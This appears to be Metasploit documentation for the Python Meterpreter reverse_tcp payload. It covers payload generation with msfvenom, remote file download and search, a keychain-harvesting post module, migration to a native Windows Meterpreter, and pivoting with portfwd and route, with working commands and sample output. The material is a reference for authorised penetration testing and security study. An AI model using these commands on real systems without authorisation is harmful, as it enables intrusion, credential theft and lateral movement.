python/meterpreter/reverse_tcp allows you to remotely control the compromised system. It is a
unique payload to the Metasploit Framework, because it is cross-platform. And since Python is
a very popular programming language, some operating systems such as Ubuntu even support it
by default.

When using an exploit, using a cross-platform payload like python/meterpreter/reverse_tcp also
means you don't need to worry about which target/platform to select, the payload should work
for all of them.

## Vulnerable Application

The Python Meterpreter is suitable for any systems that support Python. Some operating
systems such as Ubuntu, Debian, Arch Linux, and OS X have it by default. The Python
Meterpreter supports the CPython implementation versions 2.5-2.7 and 3.1+.

## Deploying python/meterpreter/reverse_tcp

python/meterpreter/reverse_tcp is typically used in two different ways.

First, it can be used with an exploit as long as the Python platform is supported. This sort
of information can usually be found when you use the ```info``` command like this:

```
msf exploit(ms14_064_packager_python) > info

       Name: MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python
     Module: exploit/windows/fileformat/ms14_064_packager_python
   Platform: Python
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2014-11-12

.... more info here ...
```

Or, you can check the exploit's target list by doing ```show targets```, there might be Python
on the list.

If your exploit supports Python, here is how to load it:

1. In msfconsole, select the exploit.
2. Configure the options for that exploit.
3. Do: ```set PAYLOAD python/meterpreter/reverse_tcp```
4. Set the ```LHOST``` datastore option, which is the [IP that the payload should connect to](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit).
5. Do ```exploit```. If the exploit is successful, it should execute that payload.

Another way to use the Python Meterpreter is to generate it as a Python file. Normally, you would
want to do this with msfvenom, like this:

```
./msfvenom -p python/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f raw -o /tmp/python.py
```

## Important Basic Commands

Compared to a native Meterpreter such as windows/meterpreter/reverse_tcp, the Python Meterpreter
has less commands, but here's a list of all the common ones you might need:

**pwd command**

The ```pwd``` command tells you the current working directory. For example:

```
meterpreter > pwd
/Users/sinn3r/Desktop
```

**cd command**

The ```cd``` command allows you to change directories. Example:

```
meterpreter > cd /Users/sinn3r/Desktop
meterpreter > pwd
/Users/sinn3r/Desktop
```

**cat command**

The ```cat``` command allows you to see the content of a file:

```
meterpreter > cat /tmp/data.txt
Hello World!
```

**upload command**

The ```upload``` command allows you to upload a file to the remote target. For example:

```
meterpreter > upload /tmp/data.txt /Users/sinn3r/Desktop
[*] uploading  : /tmp/data.txt -> /Users/sinn3r/Desktop
[*] uploaded   : /tmp/data.txt -> /Users/sinn3r/Desktop/data.txt
meterpreter >
```

**download command**

The ```download``` command allows you to download a file from the remote target to your machine.
For example:

```
meterpreter > download /Users/sinn3r/Desktop/data.txt /tmp/pass.txt
[*] downloading: /Users/sinn3r/Desktop/data.txt -> /tmp/pass.txt/data.txt
[*] download   : /Users/sinn3r/Desktop/data.txt -> /tmp/pass.txt/data.txt
meterpreter >
```

**search command**

The ```search``` command allows you to find files on the remote file system. For example,
this shows how to find all text files in the current directory:

```
meterpreter > search -d . -f *.txt
Found 2 results...
    .\pass.txt (13 bytes)
    ./creds\data.txt (83 bytes)
meterpreter >
```

Without the ```-d``` option, the command will attempt to search in all drives.

The ```-r``` option for the command allows you to search recursively.


**getuid command**

The ```getuid``` command tells you the current user that Meterpreter is running on. For example:

```
meterpreter > getuid
Server username: root
```

**execute command**

The ```execute``` command allows you to execute a command or file on the remote machine.

The following examples uses the command to create a text file:

```
meterpreter > execute -f echo -a "hello > /tmp/hello.txt"
Process 73642 created.
meterpreter >
```

**ps command**

The ```ps``` command lists the running processes on the remote machine.

**shell command**

The ```shell``` command allows you to interact with the remote machine's command prompt (or shell).
For example:

```
meterpreter > shell
Process 74513 created.
Channel 2 created.
sh-3.2#
```

If you wish to get back to Meterpreter, do [CTRL]+[Z] to background the channel.

**sysinfo**

The ```sysinfo``` command shows you basic information about the remote machine. Such as:

* Computer name
* OS name
* Architecture
* Meterpreter type

## Using a Post Module

One of the best things about Meterprter is you have access to a variety of post modules that
"shell" sessions might not have. Post modules provide you with more capabilities to collect
data from the remote machine automatically. For example, stealing credentials from the system
or third-party applications, or modify settings, etc.

To use a post module from the Meterpreter prompt, simply use the ```run``` command. The following
is an example of collecting OS X keychain information using the enum_keychain post module:

```
meterpreter > run post/osx/gather/enum_keychain

[*] The following keychains for root were found:
    "/Users/sinn3r/Library/Keychains/login.keychain"
    "/Library/Keychains/System.keychain"
[+] 192.168.1.209:58023 - Keychain information saved in /Users/sinn3r/.msf4/loot/20160705211412_http_192.168.1.209_macosx.keychain._271980.txt
meterpreter >
```

## Using the Post Exploitation API in IRB

To enter IRB, do the following at the Meterpreter prompt:

```
meterpreter > irb
[*] Starting IRB shell
[*] The 'client' variable holds the meterpreter client

>>
```

**The client object**

The client object in Meterpreter allows you to control or retrieve information about the host. For
example, this allows you to get the current privilege our payload is running as:

```
>> client.sys.config.getuid
=> "root"
```

To explore the client object, there are a few tricks. For example, you can use the #inspect method
to inspect it:

```
>> client.inspect
```

You can also use the #methods method to see what methods you can use:

```
>> client.methods
```

To review the source of the method, you can use the #source_location method. For example, say we
want to see the source code for the #getuid method:

```
>> client.sys.config.method(:getuid).source_location
=> ["/Users/sinn3r/rapid7/msf/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb", 32]
```

The first element of the array is the location of the file. The second is the line number of
the method.

**Railgun**

If you are familiar with using the post exploitation API for Windows, you probably know about
Railgun. Unfortunately, Railgun is not available in Python Meterpreters.

## Switching to a Native Meterpreter

The Python Meterpreter currently does not quite have the same strength as a native Meterpreter,
therefore there are times you will want to migrate to a native one to expose yourself with more
features.

There are many ways to migrate to a native Meterpreter, some common approaches:

**Example 1: Upload and Execute**

Step 1: Produce a native Meterpreter, such as:

```
./msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=5555 -f exe -o /tmp/native.exe
```

Step 2: Start another handler for the native payload:

```
./msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST [IP]; set LPORT 5555; run"
```

Step 3: Upload the native via the Python Meterpreter session:

```
meterpreter > upload /tmp/native.exe C:\\Users\\sinn3r\\Desktop
[*] uploading  : /tmp/native.exe -> C:\Users\sinn3r\Desktop
[*] uploaded   : /tmp/native.exe -> C:\Users\sinn3r\Desktop\native.exe
meterpreter >
```

Step 4: Execute the native payload:

```
meterpreter > execute -H -f C:\\Users\\sinn3r\\Desktop\\native.exe
Process 2764 created.
```

And then your other handler (for the native payload) should receive that session:

```
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.220
[*] Meterpreter session 1 opened (192.168.1.209:5555 -> 192.168.1.220:49306) at 2016-07-05 21:48:04 -0500

meterpreter > sysinfo
Computer        : WIN-6NH0Q8CJQVM
OS              : Windows 7 (Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter >
```

**Example 2: Using exploit/multi/script/web_delivery**

Another way to migrate to a native Meterpreter is by using the exploit/multi/script/web_delivery
module. To learn how, please read the module documentation for that module.

## Routing through the portfwd command

The portfwd command allows you to talk to a remote service like it's local. For example, if you
cannot talk to the SMB service remotely on the compromised host because it is firewalled, then
you can use portfwd to establish that tunnel:

```
meterpreter > portfwd add -l 445 -p 445 -r 192.168.1.220
[*] Local TCP relay created: :445 <-> 192.168.1.220:445
meterpreter > portfwd

Active Port Forwards
====================

   Index  Local        Remote             Direction
   -----  -----        ------             ---------
   1      0.0.0.0:445  192.168.1.220:445  Forward
```

And then talk to it like it's a local service:

```
msf auxiliary(smb_version) > run

[*] 127.0.0.1:445         - Host is running Windows 7 Ultimate SP1 (build:7601)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Routing through msfconsole

The route command from the msf prompt can also be used to bypass firewall like portfwd, but it also
allows you to connect to hosts on a different network through the compromised machine.

To do that, first off, look at the ifconfig/ipconfig output and determine your pivot point:

```
meterpreter > ipconfig
```

Make sure you know the subnet, netmask, and the Meterpreter/session ID. Return to the msf prompt,
and establish that route:

```
msf > route add 192.168.1.0 255.255.255.0 1
```

At that point, you should have a working pivot. You can use other Metasploit modules to explore
or exploit more hosts on the network, or use auxiliary/server/socks4a and [Proxychains](http://proxychains.sourceforge.net/) to allow
other third-party tools to do the same.
